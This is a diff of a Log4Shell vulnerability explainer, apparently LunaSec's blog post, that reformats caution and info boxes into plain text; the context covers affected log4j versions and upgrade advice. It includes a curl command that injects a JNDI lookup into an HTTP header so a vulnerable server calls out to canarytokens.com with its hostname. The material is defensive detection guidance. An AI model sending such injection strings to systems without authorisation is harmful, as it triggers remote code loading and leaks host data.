@@ -33,7 +33,6 @@ The 0-day was [tweeted](https://web.archive.org/web/20211211082351/https://twitt
 
 This post provides resources to help you understand the vulnerability and how to mitigate it.
 
-<!--truncate-->
 
 _This blog post is also available at https://log4shell.com/_
 
@@ -77,14 +76,14 @@ Almost all versions of log4j version 2 are affected.
 
 `2.0-beta9 <= Apache log4j <= 2.14.1`
 
-:::caution Limited vulnerabilities found in `2.15.0` and `2.16.0`
+Caution: Limited vulnerabilities found in `2.15.0` and `2.16.0`
 As of Tuesday, Dec 14, version `2.15.0` was found to still have a possible [vulnerability in some apps](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f). And, a few days later, a DOS vulnerability was found in `2.16.0` too.
 
 ~~We recommend updating to `2.16.0` which [disables](https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea) JNDI and [completely removes](https://github.com/apache/logging-log4j2/pull/623) `%m{lookups}`.~~ (Updated: See below)
 
 We recommend updating to `2.17.0` which includes the fixes introduced in `2.16.0` as well as a fix for a [discovered denial
 of service (DOS) attack](https://logging.apache.org/log4j/2.x/security.html).
-:::
+
 ### log4j v1
 
 Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it, you need to
@@ -103,11 +102,10 @@ The release can also be downloaded from the Apache Log4j [Download](https://logg
 
 **For Current Information:** Please read our follow-up guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).
 
-:::warning `formatMsgNoLookups` Does not protect against all attacks
+Warning: `formatMsgNoLookups` Does not protect against all attacks
 As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, which is partially explained in
 [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046).  
 You must update to `2.17.0`, or use the JNDI patches for temporary mitigation explained in [our mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
-:::
 
 As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=29507263):
 
@@ -203,8 +201,8 @@ exploit payload that could be used for this vulnerability. You can refer to [thi
 
 ## How to identify vulnerable remote servers
 
-:::info Make sure that you have permission from the owner of the server being penetration tested.
-:::
+Note: 
+Make sure that you have permission from the owner of the server being penetration tested.
 
 The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
 the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
@@ -219,10 +217,10 @@ input to an HTTP header.  In our example above, the X-Api-Version header was bei
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
 ```
 
-:::info These requests may not be private
+Note: 
+These requests may not be private
 If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
 for testing.
-:::
 
 ## More information
 
